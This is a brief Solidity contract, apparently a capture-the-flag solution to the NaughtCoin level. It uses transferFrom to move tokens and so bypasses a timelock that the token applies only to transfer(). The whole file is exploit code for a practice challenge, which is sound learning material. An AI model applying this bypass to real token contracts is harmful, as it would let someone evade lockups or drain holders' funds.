// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./INaughtCoin.sol";

contract NaughtAttacker {
    function performAttack(address _tokenAddress, uint256 _amount) external {
        INaughtCoin token = INaughtCoin(_tokenAddress);
        token.transferFrom(msg.sender, address(this), _amount);
    }
}